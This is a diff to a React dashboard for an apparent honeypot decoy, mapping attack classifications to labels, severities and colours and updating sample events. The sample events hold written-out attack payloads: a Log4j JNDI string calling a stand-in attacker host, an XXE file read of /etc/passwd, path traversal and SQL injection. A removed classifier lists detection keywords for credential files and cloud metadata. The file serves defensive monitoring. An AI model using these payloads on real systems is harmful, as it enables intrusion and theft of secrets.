@@ -2,10 +2,160 @@ import { useCallback, useEffect, useMemo, useState } from 'react'
 import { Link } from 'react-router-dom'
 import { getSecurityEvents, dispatchAttackProbe } from '../services/api'
 
+// Lookup table mapping the 12 backend classification labels to display name, color, and severity
+export const CLASSIFICATION_META = {
+  benign_probe: {
+    label: 'benign_probe',
+    displayName: 'Benign Probe',
+    color: '#4ade80',
+    severity: 'INFO',
+    severityColor: '#10b981',
+    cssClass: 'benign',
+    barClass: 'benign',
+  },
+  sqli_attempt: {
+    label: 'sqli_attempt',
+    displayName: 'SQLi Attempt',
+    color: '#fb923c',
+    severity: 'CRITICAL',
+    severityColor: '#ef4444',
+    cssClass: 'sqli',
+    barClass: 'sqli',
+  },
+  nosql_injection: {
+    label: 'nosql_injection',
+    displayName: 'NoSQL Injection',
+    color: '#34d399',
+    severity: 'MEDIUM',
+    severityColor: '#f59e0b',
+    cssClass: 'nosql',
+    barClass: 'nosql',
+  },
+  rce_attempt: {
+    label: 'rce_attempt',
+    displayName: 'RCE Attempt',
+    color: '#f87171',
+    severity: 'CRITICAL',
+    severityColor: '#ef4444',
+    cssClass: 'rce',
+    barClass: 'rce',
+  },
+  ssrf_attempt: {
+    label: 'ssrf_attempt',
+    displayName: 'SSRF Attempt',
+    color: '#d8b4fe',
+    severity: 'CRITICAL',
+    severityColor: '#ef4444',
+    cssClass: 'ssrf',
+    barClass: 'ssrf',
+  },
+  log4j_jndi: {
+    label: 'log4j_jndi',
+    displayName: 'Log4j / JNDI',
+    color: '#fdba74',
+    severity: 'CRITICAL',
+    severityColor: '#ef4444',
+    cssClass: 'log4j',
+    barClass: 'log4j',
+  },
+  xss_attempt: {
+    label: 'xss_attempt',
+    displayName: 'XSS Attempt',
+    color: '#c084fc',
+    severity: 'HIGH',
+    severityColor: '#f97316',
+    cssClass: 'xss',
+    barClass: 'xss',
+  },
+  xxe_attempt: {
+    label: 'xxe_attempt',
+    displayName: 'XXE Attempt',
+    color: '#5eead4',
+    severity: 'CRITICAL',
+    severityColor: '#ef4444',
+    cssClass: 'xxe',
+    barClass: 'xxe',
+  },
+  path_traversal: {
+    label: 'path_traversal',
+    displayName: 'Path Traversal',
+    color: '#fbbf24',
+    severity: 'HIGH',
+    severityColor: '#f97316',
+    cssClass: 'traversal',
+    barClass: 'traversal',
+  },
+  secret_harvesting: {
+    label: 'secret_harvesting',
+    displayName: 'Secret Harvesting',
+    color: '#fde047',
+    severity: 'MEDIUM',
+    severityColor: '#f59e0b',
+    cssClass: 'secrets',
+    barClass: 'secrets',
+  },
+  known_scanner: {
+    label: 'known_scanner',
+    displayName: 'Known Scanner',
+    color: '#38bdf8',
+    severity: 'MEDIUM',
+    severityColor: '#f59e0b',
+    cssClass: 'scanner',
+    barClass: 'scanner',
+  },
+  brute_force: {
+    label: 'brute_force',
+    displayName: 'Brute Force',
+    color: '#f472b6',
+    severity: 'HIGH',
+    severityColor: '#f97316',
+    cssClass: 'brute-force',
+    barClass: 'brute',
+  },
+}
+
+// Aliases for legacy 5-label entries so older records map gracefully
+const LEGACY_ALIASES = {
+  sqli: 'sqli_attempt',
+  rce: 'rce_attempt',
+  ssrf: 'ssrf_attempt',
+  log4j: 'log4j_jndi',
+  xss: 'xss_attempt',
+  traversal: 'path_traversal',
+  secrets: 'secret_harvesting',
+  nosql: 'nosql_injection',
+  scanner: 'known_scanner',
+  brute: 'brute_force',
+  benign: 'benign_probe',
+}
+
+export function getClassificationMeta(rawClassification) {
+  const cleanKey = String(rawClassification || '').trim().toLowerCase()
+  if (CLASSIFICATION_META[cleanKey]) {
+    return CLASSIFICATION_META[cleanKey]
+  }
+  // Check legacy shorthand aliases
+  if (LEGACY_ALIASES[cleanKey] && CLASSIFICATION_META[LEGACY_ALIASES[cleanKey]]) {
+    return CLASSIFICATION_META[LEGACY_ALIASES[cleanKey]]
+  }
+  // Unknown label -> show raw label
+  return {
+    label: rawClassification || 'unknown',
+    displayName: rawClassification || 'unknown',
+    color: '#94a3b8',
+    severity: 'UNKNOWN',
+    severityColor: '#94a3b8',
+    cssClass: 'unknown',
+    barClass: 'unknown',
+  }
+}
+
 const SAMPLE_EVENTS = [
   {
     route_hit: 'main_decoy',
     classification: 'sqli_attempt',
+    matched_rule: 'RULE_SQLI_UNION_SELECT',
+    status_code: 200,
     path: '/default/ghostHouseDecoy/login',
     request_id: '36a664b5-df81-4dc9-8307-96aa96381696',
     user_agent: 'sqlmap/1.7.2#stable',
@@ -17,7 +167,9 @@ const SAMPLE_EVENTS = [
   },
   {
     route_hit: 'main_decoy',
-    classification: 'rce',
+    classification: 'rce_attempt',
+    matched_rule: 'RULE_RCE_SYSTEM_COMMAND',
+    status_code: 200,
     path: '/default/ghostHouseDecoy/admin',
     request_id: '81c4e721-a4b3-4f9e-9912-8812cfa09911',
     user_agent: 'GhostHouse-RCE-Sim/1.0',
@@ -29,7 +181,9 @@ const SAMPLE_EVENTS = [
   },
   {
     route_hit: 'main_decoy',
-    classification: 'ssrf',
+    classification: 'ssrf_attempt',
+    matched_rule: 'RULE_SSRF_AWS_METADATA',
+    status_code: 200,
     path: '/default/ghostHouseDecoy/api/proxy',
     request_id: '77d291ba-031e-45fa-b671-55fa110099ee',
     user_agent: 'GhostHouse-SSRF-Sim/1.0',
@@ -41,7 +195,9 @@ const SAMPLE_EVENTS = [
   },
   {
     route_hit: 'main_decoy',
-    classification: 'log4j',
+    classification: 'log4j_jndi',
+    matched_rule: 'RULE_LOG4J_JNDI_LOOKUP',
+    status_code: 200,
     path: '/default/ghostHouseDecoy/login',
     request_id: '44ef1182-d21b-4399-aa54-990141bb7721',
     user_agent: '${jndi:ldap://attacker.threat-mesh.org/exploit}',
@@ -53,7 +209,9 @@ const SAMPLE_EVENTS = [
   },
   {
     route_hit: 'main_decoy',
-    classification: 'xss',
+    classification: 'xss_attempt',
+    matched_rule: 'RULE_XSS_SCRIPT_TAG',
+    status_code: 200,
     path: '/default/ghostHouseDecoy/login',
     request_id: '99bf2401-cc19-4871-8899-771129aa4410',
     user_agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
@@ -66,6 +224,8 @@ const SAMPLE_EVENTS = [
   {
     route_hit: 'main_decoy',
     classification: 'path_traversal',
+    matched_rule: 'RULE_PATH_TRAVERSAL_DOT_DOT',
+    status_code: 200,
     path: '/default/ghostHouseDecoy/..%2f..%2f..%2fetc/passwd',
     request_id: '55da8129-ef01-4412-9901-ee4499118833',
     user_agent: 'Mozilla/5.0 (Traversal-Bot)',
@@ -77,7 +237,9 @@ const SAMPLE_EVENTS = [
   },
   {
     route_hit: 'main_decoy',
-    classification: 'secrets',
+    classification: 'secret_harvesting',
+    matched_rule: 'RULE_SECRET_ENV_FILE',
+    status_code: 200,
     path: '/default/ghostHouseDecoy/.env',
     request_id: 'fc2e79f8-95c5-4889-b77e-d31eb2ff2299',
     user_agent: 'SecretHunter/1.0',
@@ -89,7 +251,9 @@ const SAMPLE_EVENTS = [
   },
   {
     route_hit: 'main_decoy',
-    classification: 'nosql',
+    classification: 'nosql_injection',
+    matched_rule: 'RULE_NOSQL_GT_OPERATOR',
+    status_code: 200,
     path: '/default/ghostHouseDecoy/login',
     request_id: '66a19024-aa99-4112-bb44-889900112233',
     user_agent: 'GhostHouse-NoSQL-Sim/1.0',
@@ -102,6 +266,8 @@ const SAMPLE_EVENTS = [
   {
     route_hit: 'main_decoy',
     classification: 'brute_force',
+    matched_rule: 'RULE_RATE_LIMIT_BRUTE_FORCE',
+    status_code: 401,
     path: '/default/ghostHouseDecoy/login',
     request_id: 'a95c6ae0-08a7-496e-a15b-5efa0c9f119c',
     user_agent: 'Hydra/9.5',
@@ -114,6 +280,8 @@ const SAMPLE_EVENTS = [
   {
     route_hit: 'main_decoy',
     classification: 'known_scanner',
+    matched_rule: 'RULE_SCANNER_USER_AGENT',
+    status_code: 200,
     path: '/default/ghostHouseDecoy/robots.txt',
     request_id: '33cc1190-8812-4f99-aa33-776655443322',
     user_agent: 'Nikto/2.1.6',
@@ -125,7 +293,23 @@ const SAMPLE_EVENTS = [
   },
   {
     route_hit: 'main_decoy',
+    classification: 'xxe_attempt',
+    matched_rule: 'RULE_XXE_DOCTYPE_DECLARATION',
+    status_code: 200,
+    path: '/default/ghostHouseDecoy/api/xml',
+    request_id: '88de1902-11bb-4f33-aa22-441199338822',
+    user_agent: 'GhostHouse-XXE-Sim/1.0',
+    source_ip: '198.51.100.112',
+    timestamp: new Date(Date.now() - 1000 * 60 * 16).toISOString(),
+    method: 'POST',
+    body: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+    query_params: '{}',
+  },
+  {
+    route_hit: 'main_decoy',
     classification: 'benign_probe',
+    matched_rule: 'RULE_BENIGN_APPLICATION_TRAFFIC',
+    status_code: 200,
     path: '/default/ghostHouseDecoy/dashboard',
     request_id: 'efc0980a-5081-4105-9230-e7c90180cba1',
     user_agent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
@@ -136,209 +320,6 @@ const SAMPLE_EVENTS = [
     query_params: '{}',
   },
 ]
-
-function classifyEvent(event) {
-  const rawType = String(
-    event.classification ||
-    event.type ||
-    event.attackType ||
-    event.attack_type ||
-    event.threat ||
-    ''
-  ).toLowerCase().trim()
-
-  const bodyStr = String(event.body || '').toLowerCase()
-  const pathStr = String(event.path || event.route || '').toLowerCase()
-  const agentStr = String(event.user_agent || event.userAgent || '').toLowerCase()
-  const queryStr = String(event.query_params || event.queryParams || '').toLowerCase()
-
-  // 1. Log4j / JNDI Exploit
-  if (
-    rawType.includes('log4j') ||
-    rawType.includes('jndi') ||
-    bodyStr.includes('${jndi:') ||
-    pathStr.includes('${jndi:') ||
-    agentStr.includes('${jndi:') ||
-    queryStr.includes('${jndi:')
-  ) {
-    return 'Log4j Exploit'
-  }
-
-  // 2. Remote Command Injection (RCE)
-  if (
-    rawType.includes('rce') ||
-    rawType.includes('command') ||
-    bodyStr.includes('whoami') ||
-    bodyStr.includes('cat /etc') ||
-    bodyStr.includes('| uname') ||
-    bodyStr.includes('cmd=') ||
-    bodyStr.includes('; id') ||
-    queryStr.includes('whoami')
-  ) {
-    return 'Command Injection (RCE)'
-  }
-
-  // 3. Server-Side Request Forgery (SSRF) / Cloud Metadata
-  if (
-    rawType.includes('ssrf') ||
-    queryStr.includes('169.254.169.254') ||
-    bodyStr.includes('169.254.169.254') ||
-    pathStr.includes('169.254.169.254') ||
-    queryStr.includes('metadata.google') ||
-    queryStr.includes('127.0.0.1:8080')
-  ) {
-    return 'SSRF / Cloud Metadata'
-  }
-
-  // 4. Cross-Site Scripting (XSS)
-  if (
-    rawType.includes('xss') ||
-    bodyStr.includes('<script') ||
-    bodyStr.includes('onerror=') ||
-    bodyStr.includes('<svg') ||
-    bodyStr.includes('javascript:')
-  ) {
-    return 'Cross-Site Scripting (XSS)'
-  }
-
-  // 5. XML External Entity (XXE)
-  if (
-    rawType.includes('xxe') ||
-    bodyStr.includes('<!doctype') ||
-    bodyStr.includes('<!entity') ||
-    bodyStr.includes('&xxe;')
-  ) {
-    return 'XXE Injection'
-  }
-
-  // 6. NoSQL Injection
-  if (
-    rawType.includes('nosql') ||
-    bodyStr.includes('"$gt"') ||
-    bodyStr.includes('"$ne"') ||
-    bodyStr.includes('"$where"')
-  ) {
-    return 'NoSQL Injection'
-  }
-
-  // 7. Sensitive Secrets Harvesting
-  if (
-    rawType.includes('secret') ||
-    pathStr.includes('/.env') ||
-    pathStr.includes('/.git') ||
-    pathStr.includes('/.aws') ||
-    pathStr.includes('/backup.sql') ||
-    pathStr.includes('/id_rsa') ||
-    agentStr.includes('secrethunter')
-  ) {
-    return 'Secret Harvesting'
-  }
-
-  // 8. SQL Injection (SQLi)
-  if (
-    rawType.includes('sql') ||
-    rawType === 'sqli_attempt' ||
-    bodyStr.includes("' or '1'='1") ||
-    bodyStr.includes('union select') ||
-    bodyStr.includes('drop table') ||
-    agentStr.includes('sqlmap')
-  ) {
-    return 'SQLi Attempt'
-  }
-
-  // 9. Path Traversal / LFI
-  if (
-    rawType.includes('traversal') ||
-    rawType === 'path_traversal' ||
-    pathStr.includes('..') ||
-    pathStr.includes('etc/passwd') ||
-    pathStr.includes('win.ini')
-  ) {
-    return 'Path Traversal'
-  }
-
-  // 10. Automated Reconnaissance Scanner
-  if (
-    rawType.includes('scan') ||
-    rawType === 'known_scanner' ||
-    agentStr.includes('nikto') ||
-    agentStr.includes('dirbuster') ||
-    agentStr.includes('nmap') ||
-    agentStr.includes('masscan')
-  ) {
-    return 'Known Scanner'
-  }
-
-  // 11. Sliding-Window Brute Force
-  if (rawType.includes('brute') || rawType === 'brute_force' || agentStr.includes('hydra')) {
-    return 'Brute Force'
-  }
-
-  // 12. Benign Surface Exploration
-  if (rawType.includes('benign') || rawType === 'benign_probe') {
-    return 'Benign Probe'
-  }
-
-  return rawType ? rawType.toUpperCase() : 'Benign Probe'
-}
-
-function classificationClass(type) {
-  switch (type) {
-    case 'SQLi Attempt':
-      return 'sqli'
-    case 'Brute Force':
-      return 'brute-force'
-    case 'Path Traversal':
-      return 'traversal'
-    case 'Known Scanner':
-      return 'scanner'
-    case 'Cross-Site Scripting (XSS)':
-      return 'xss'
-    case 'Command Injection (RCE)':
-      return 'rce'
-    case 'SSRF / Cloud Metadata':
-      return 'ssrf'
-    case 'Log4j Exploit':
-      return 'log4j'
-    case 'NoSQL Injection':
-      return 'nosql'
-    case 'Secret Harvesting':
-      return 'secrets'
-    case 'XXE Injection':
-      return 'xxe'
-    case 'Benign Probe':
-      return 'benign'
-    default:
-      return 'benign'
-  }
-}
-
-function getSeverityBadge(type) {
-  if (
-    type === 'SQLi Attempt' ||
-    type === 'Command Injection (RCE)' ||
-    type === 'SSRF / Cloud Metadata' ||
-    type === 'Log4j Exploit' ||
-    type === 'XXE Injection'
-  ) {
-    return { level: 'CRITICAL', color: '#ef4444' }
-  }
-  if (
-    type === 'Cross-Site Scripting (XSS)' ||
-    type === 'Path Traversal' ||
-    type === 'Brute Force'
-  ) {
-    return { level: 'HIGH', color: '#f97316' }
-  }
-  if (
-    type === 'NoSQL Injection' ||
-    type === 'Secret Harvesting' ||
-    type === 'Known Scanner'
-  ) {
-    return { level: 'MEDIUM', color: '#f59e0b' }
-  }
-  return { level: 'INFO', color: '#10b981' }
-}
 
 function formatTime(value) {
   if (!value) return '--:--:--'
@@ -354,8 +335,22 @@ function formatTime(value) {
   })
 }
 
+// Normalize incoming backend logs: display classification as received, parse status_code and matched_rule
 function normalizeEvent(event) {
-  const type = classifyEvent(event)
+  const rawClassification = String(
+    event.classification || event.type || event.attackType || 'benign_probe'
+  ).trim()
+  const meta = getClassificationMeta(rawClassification)
+
+  // Status code: show status_code; show "-" if missing. Never hardcode 200.
+  let statusCodeDisplay = '-'
+  const rawStatus = event.status_code ?? event.statusCode ?? event.status
+  if (rawStatus !== undefined && rawStatus !== null && String(rawStatus).trim() !== '') {
+    statusCodeDisplay = String(rawStatus).trim()
+  }
+
+  const matchedRule = event.matched_rule || event.matchedRule || '-'
+
   return {
     raw: event,
     time: formatTime(event.time || event.timestamp || event.createdAt || event.created_at),
@@ -369,13 +364,30 @@ function normalizeEvent(event) {
       'Unknown',
     method: event.method || event.httpMethod || event.http_method || 'GET',
     route: event.route || event.path || event.url || event.resource || '/',
-    type,
-    status: event.status || event.statusCode || event.status_code || '200',
+    classification: rawClassification,
+    meta,
+    statusCode: statusCodeDisplay,
+    matchedRule,
     userAgent: event.user_agent || event.userAgent || 'N/A',
     requestId: event.request_id || event.requestId || 'N/A',
     body: event.body || '',
     queryParams: event.query_params || event.queryParams || '{}',
   }
+}
+
+const LAUNCHER_LABEL_MAP = {
+  sqli: 'sqli_attempt',
+  xss: 'xss_attempt',
+  rce: 'rce_attempt',
+  ssrf: 'ssrf_attempt',
+  log4j: 'log4j_jndi',
+  traversal: 'path_traversal',
+  secrets: 'secret_harvesting',
+  nosql: 'nosql_injection',
+  scanner: 'known_scanner',
+  brute: 'brute_force',
+  xxe: 'xxe_attempt',
+  benign: 'benign_probe',
 }
 
 function Monitor() {
@@ -467,17 +479,20 @@ function Monitor() {
         `✓ [${attackType.toUpperCase()}] Probe dispatched to AWS Decoy Endpoint! Status: ${res.status}`
       )
 
-      // If user is currently viewing demo data, also synthesize this event locally for instant visual feedback
+      // If user is currently viewing demo data, synthesize event using the backend classification schema
       if (usingDemoData) {
+        const backendLabel = LAUNCHER_LABEL_MAP[attackType] || attackType
         const synthetic = {
-          classification: attackType,
+          classification: backendLabel,
+          matched_rule: `RULE_${backendLabel.toUpperCase()}`,
+          status_code: attackType === 'brute' ? '401' : '200',
           path: `/default/ghostHouseDecoy/${attackType === 'sqli' ? 'login' : attackType}`,
           request_id: 'sim-' + Math.random().toString(36).substring(2, 10),
-          user_agent: `GhostHouse-${attackType.toUpperCase()}-Sim`,
+          user_agent: `GhostHouse-${backendLabel}-Sim`,
           source_ip: '198.51.100.' + (Math.floor(Math.random() * 80) + 10),
           timestamp: new Date().toISOString(),
           method: attackType === 'traversal' || attackType === 'secrets' ? 'GET' : 'POST',
-          body: attackType === 'sqli' ? '{"username": "\' UNION SELECT NULL, password FROM users --"}' : `{"probe": "${attackType}"}`,
+          body: attackType === 'sqli' ? '{"username": "\' UNION SELECT NULL, password FROM users --"}' : `{"probe": "${backendLabel}"}`,
           query_params: '{}',
         }
         setEvents((prev) => [normalizeEvent(synthetic), ...prev])
@@ -492,70 +507,93 @@ function Monitor() {
     }
   }
 
-  // Compute stats
+  // Compute stats driven strictly by classification
   const stats = useMemo(() => {
     const counts = events.reduce(
       (summary, event) => {
         summary.total += 1
-        const isMalicious = event.type !== 'Benign Probe'
+        const isMalicious = event.classification !== 'benign_probe'
         if (isMalicious) {
           summary.suspicious += 1
         }
-        summary.byType[event.type] = (summary.byType[event.type] || 0) + 1
+        summary.byClassification[event.classification] =
+          (summary.byClassification[event.classification] || 0) + 1
         summary.uniqueIps.add(event.ip)
         return summary
       },
       {
         total: 0,
         suspicious: 0,
-        byType: {},
+        byClassification: {},
         uniqueIps: new Set(),
       }
     )
+
+    const distinctVectors = Object.keys(counts.byClassification).filter(
+      (k) => counts.byClassification[k] > 0
+    ).length
 
     return {
       total: counts.total,
       suspicious: counts.suspicious,
       uniqueIpsCount: counts.uniqueIps.size,
-      byType: counts.byType,
-      attackTypesCount: Object.keys(counts.byType).length,
+      byClassification: counts.byClassification,
+      attackTypesCount: distinctVectors,
     }
   }, [events])
 
-  // Chart distribution
-  const allCategoryLabels = [
-    'SQLi Attempt',
-    'Brute Force',
-    'Path Traversal',
-    'Known Scanner',
-    'Cross-Site Scripting (XSS)',
-    'Command Injection (RCE)',
-    'SSRF / Cloud Metadata',
-    'Log4j Exploit',
-    'NoSQL Injection',
-    'Secret Harvesting',
-    'XXE Injection',
-    'Benign Probe',
-  ]
-
+  // Chart distribution: driven strictly by classification; bars sum to total row count
   const attackBars = useMemo(() => {
-    return allCategoryLabels
-      .map((label) => {
-        const count = stats.byType[label] || 0
-        const className = classificationClass(label)
-        const width = stats.total > 0 && count > 0
-          ? `${Math.max((count / stats.total) * 100, 6)}%`
-          : '0%'
-        return { label, className, count, width }
+    const canonicalOrder = [
+      'sqli_attempt',
+      'brute_force',
+      'path_traversal',
+      'known_scanner',
+      'xss_attempt',
+      'rce_attempt',
+      'ssrf_attempt',
+      'log4j_jndi',
+      'nosql_injection',
+      'secret_harvesting',
+      'xxe_attempt',
+      'benign_probe',
+    ]
+
+    // Ensure any unexpected/legacy classifications present in the events are also included
+    const presentKeys = Object.keys(stats.byClassification)
+    const allKeys = [...canonicalOrder]
+    for (const key of presentKeys) {
+      if (!allKeys.includes(key)) {
+        allKeys.push(key)
+      }
+    }
+
+    return allKeys
+      .map((key) => {
+        const count = stats.byClassification[key] || 0
+        const meta = getClassificationMeta(key)
+        const pct = stats.total > 0 ? (count / stats.total) * 100 : 0
+        const width = `${pct.toFixed(1)}%`
+        return {
+          key,
+          label: meta.displayName,
+          count,
+          pct,
+          width,
+          className: meta.barClass,
+          color: meta.color,
+        }
       })
       .filter((bar) => bar.count > 0 || usingDemoData)
   }, [stats, usingDemoData])
 
-  // Filter and search
+  // Filter and search driven by classification
   const filteredEvents = useMemo(() => {
     return events.filter((event) => {
       const matchesFilter =
-        activeFilter === 'ALL' || event.type.toLowerCase() === activeFilter.toLowerCase()
+        activeFilter === 'ALL' ||
+        event.classification === activeFilter ||
+        event.meta.displayName.toLowerCase() === activeFilter.toLowerCase()
 
       const query = searchQuery.trim().toLowerCase()
       const matchesQuery =
@@ -564,14 +602,17 @@ function Monitor() {
         event.route.toLowerCase().includes(query) ||
         event.method.toLowerCase().includes(query) ||
         event.userAgent.toLowerCase().includes(query) ||
-        event.type.toLowerCase().includes(query) ||
+        event.classification.toLowerCase().includes(query) ||
+        event.meta.displayName.toLowerCase().includes(query) ||
+        event.matchedRule.toLowerCase().includes(query) ||
+        event.statusCode.toLowerCase().includes(query) ||
         event.body.toLowerCase().includes(query)
 
       return matchesFilter && matchesQuery
     })
   }, [events, activeFilter, searchQuery])
 
-  // Export handlers
+  // Export handlers driven by backend classification fields
   const handleExportJSON = () => {
     const jsonStr = JSON.stringify(events.map((e) => e.raw || e), null, 2)
     const blob = new Blob([jsonStr], { type: 'application/json' })
@@ -586,12 +627,14 @@ function Monitor() {
   const handleExportCSV = () => {
     const headers = [
       'Timestamp',
-      'IP Address',
+      'Source IP',
       'Method',
       'Route',
       'Classification',
+      'Display Label',
       'Severity',
-      'Status',
+      'Matched Rule',
+      'Status Code',
       'User Agent',
       'Payload',
     ]
@@ -600,9 +643,11 @@ function Monitor() {
       `"${e.ip}"`,
       `"${e.method}"`,
       `"${e.route}"`,
-      `"${e.type}"`,
-      `"${getSeverityBadge(e.type).level}"`,
-      `"${e.status}"`,
+      `"${e.classification}"`,
+      `"${e.meta.displayName}"`,
+      `"${e.meta.severity}"`,
+      `"${e.matchedRule}"`,
+      `"${e.statusCode}"`,
       `"${e.userAgent.replace(/"/g, '""')}"`,
       `"${e.body.replace(/"/g, '""')}"`,
     ])
@@ -728,7 +773,7 @@ function Monitor() {
         <div className="monitor-stat-card">
           <span>Active Threat Vectors</span>
           <strong style={{ color: '#c084fc' }}>{stats.attackTypesCount}</strong>
-          <small>Distinct attack categories</small>
+          <small>Distinct classification vectors</small>
         </div>
       </div>
 
@@ -737,17 +782,19 @@ function Monitor() {
         <div className="section-header">
           <div>
             <h2>Threat Category Distribution</h2>
-            <p>Categorized telemetry breakdown across multi-vector exploit profiles</p>
+            <p>
+              Backend-classified telemetry breakdown (Sum of bars: <strong>{attackBars.reduce((acc, b) => acc + b.count, 0)}</strong> / {stats.total} events)
+            </p>
           </div>
         </div>
 
         <div className="attack-bars">
           {attackBars.map((attack) => (
             <div
-              className="attack-item"
-              key={attack.label}
-              onClick={() => setActiveFilter(activeFilter === attack.label ? 'ALL' : attack.label)}
-              title={`Click to filter by ${attack.label}`}
+              className={`attack-item ${activeFilter === attack.key ? 'selected' : ''}`}
+              key={attack.key}
+              onClick={() => setActiveFilter(activeFilter === attack.key ? 'ALL' : attack.key)}
+              title={`Click to filter by ${attack.label} (${attack.key})`}
             >
               <div>
                 <span>{attack.label}</span>
@@ -770,7 +817,7 @@ function Monitor() {
         <div className="section-header">
           <div>
             <h2>Real-Time Incident Stream</h2>
-            <p>Select any event row to inspect complete Layer-7 payload, injected strings, and deceptive response</p>
+            <p>Select any event row to inspect complete Layer-7 payload, injected strings, and detection rule telemetry</p>
           </div>
 
           <div className="feed-status-meta">
@@ -788,25 +835,27 @@ function Monitor() {
         {/* Filter Toolbar */}
         <div className="table-toolbar">
           <div className="filter-chips">
-            {['ALL', ...allCategoryLabels].map((category) => {
-              const count = category === 'ALL' ? events.length : stats.byType[category] || 0
-              if (category !== 'ALL' && count === 0 && !usingDemoData) return null
-              return (
-                <button
-                  key={category}
-                  className={`filter-chip ${activeFilter === category ? 'active' : ''}`}
-                  onClick={() => setActiveFilter(category)}
-                >
-                  {category} ({count})
-                </button>
-              )
-            })}
+            <button
+              className={`filter-chip ${activeFilter === 'ALL' ? 'active' : ''}`}
+              onClick={() => setActiveFilter('ALL')}
+            >
+              ALL ({events.length})
+            </button>
+            {attackBars.map((bar) => (
+              <button
+                key={bar.key}
+                className={`filter-chip ${activeFilter === bar.key ? 'active' : ''}`}
+                onClick={() => setActiveFilter(activeFilter === bar.key ? 'ALL' : bar.key)}
+              >
+                {bar.label} ({bar.count})
+              </button>
+            ))}
           </div>
 
           <div className="search-box">
             <input
               type="text"
-              placeholder="Filter by IP, Route, Method, Payload..."
+              placeholder="Filter by IP, Route, Method, Classification, Payload..."
               value={searchQuery}
               onChange={(e) => setSearchQuery(e.target.value)}
             />
@@ -837,32 +886,29 @@ function Monitor() {
             </div>
           )}
 
-          {filteredEvents.map((event, index) => {
-            const sev = getSeverityBadge(event.type)
-            return (
-              <div
-                className="table-row clickable"
-                key={`${event.time}-${event.ip}-${index}`}
-                onClick={() => setSelectedEvent(event)}
-                title="Click to inspect full event details"
-              >
-                <span className="time-cell">{event.time}</span>
+          {filteredEvents.map((event, index) => (
+            <div
+              className="table-row clickable"
+              key={`${event.time}-${event.ip}-${index}`}
+              onClick={() => setSelectedEvent(event)}
+              title="Click to inspect full event details"
+            >
+              <span className="time-cell">{event.time}</span>
 
-                <span className="ip-address">{event.ip}</span>
+              <span className="ip-address">{event.ip}</span>
 
-                <span className="method">{event.method}</span>
+              <span className="method">{event.method}</span>
 
-                <span className="route-cell">{event.route}</span>
+              <span className="route-cell">{event.route}</span>
 
-                <span className={`classification ${classificationClass(event.type)}`}>
-                  <span style={{ marginRight: '4px', opacity: 0.8 }}>[{sev.level.slice(0, 4)}]</span>
-                  {event.type}
-                </span>
+              <span className={`classification ${event.meta.cssClass}`}>
+                <span style={{ marginRight: '4px', opacity: 0.8 }}>[{event.meta.severity.slice(0, 4)}]</span>
+                {event.meta.displayName}
+              </span>
 
-                <span className="status-code">{event.status}</span>
-              </div>
-            )
-          })}
+              <span className="status-code">{event.statusCode}</span>
+            </div>
+          ))}
         </div>
       </div>
 
@@ -885,19 +931,31 @@ function Monitor() {
                 <div className="detail-field">
                   <label>Threat Classification</label>
                   <span
-                    className={`classification ${classificationClass(selectedEvent.type)}`}
+                    className={`classification ${selectedEvent.meta.cssClass}`}
                   >
-                    {selectedEvent.type}
+                    <code>{selectedEvent.classification}</code> ({selectedEvent.meta.displayName})
                   </span>
                 </div>
 
                 <div className="detail-field">
                   <label>Severity Score</label>
                   <strong>
-                    <span style={{ color: getSeverityBadge(selectedEvent.type).color }}>
-                      ● {getSeverityBadge(selectedEvent.type).level}
+                    <span style={{ color: selectedEvent.meta.severityColor }}>
+                      ● {selectedEvent.meta.severity}
                     </span>
                   </strong>
+                </div>
+
+                <div className="detail-field">
+                  <label>Matched Detection Rule</label>
+                  <code style={{ color: '#38bdf8' }}>{selectedEvent.matchedRule}</code>
+                </div>
+
+                <div className="detail-field">
+                  <label>Response Status Code</label>
+                  <code style={{ color: '#a7f3d0' }}>
+                    {selectedEvent.statusCode === '-' ? '-' : `HTTP ${selectedEvent.statusCode}`}
+                  </code>
                 </div>
 
                 <div className="detail-field">
@@ -916,11 +974,6 @@ function Monitor() {
                 </div>
 
                 <div className="detail-field">
-                  <label>Response Status</label>
-                  <code>HTTP {selectedEvent.status}</code>
-                </div>
-
-                <div className="detail-field full-width">
                   <label>API Gateway Request ID</label>
                   <code>{selectedEvent.requestId}</code>
                 </div>
@@ -940,32 +993,6 @@ function Monitor() {
                 <div className="detail-field full-width">
                   <label>Query Parameters</label>
                   <pre className="code-box">{selectedEvent.queryParams}</pre>
-                </div>
-
-                <div className="detail-field full-width">
-                  <label>Adaptive Deception Feedback Delivered</label>
-                  <div style={{
-                    background: 'rgba(255, 255, 255, 0.03)',
-                    border: '1px solid var(--border-subtle)',
-                    padding: '10px 14px',
-                    borderRadius: 'var(--radius-sm)',
-                    fontSize: '12px',
-                    color: '#94a3b8'
-                  }}>
-                    {selectedEvent.type.includes('SQL')
-                      ? 'Simulated MySQL syntax error fragment returned to adversary.'
-                      : selectedEvent.type.includes('Traversal')
-                      ? 'Synthetic OS filesystem permission error returned.'
-                      : selectedEvent.type.includes('Command')
-                      ? 'Fake shell output fragment returned with 500ms delay.'
-                      : selectedEvent.type.includes('SSRF')
-                      ? 'Dummy IAM role credentials JSON payload returned.'
-                      : selectedEvent.type.includes('Log4j')
-                      ? 'Fake LDAP connection attempt response generated.'
-                      : selectedEvent.type.includes('XSS')
-                      ? 'Input reflected inside simulated sanitized HTML context.'
-                      : 'Simulated authenticated session tokens served.'}
-                  </div>
                 </div>
               </div>
             </div>
@@ -1082,6 +1109,12 @@ function Monitor() {
                     name: 'Reconnaissance Scanner',
                     desc: 'Probes web directory root and robots.txt with Nikto scanner signature',
                     icon: '🕵️',
+                  },
+                  {
+                    type: 'xxe',
+                    name: 'XML External Entity (XXE)',
+                    desc: 'Submits XML payload with SYSTEM entity file read exploit',
+                    icon: '📜',
                   },
                   {
                     type: 'benign',
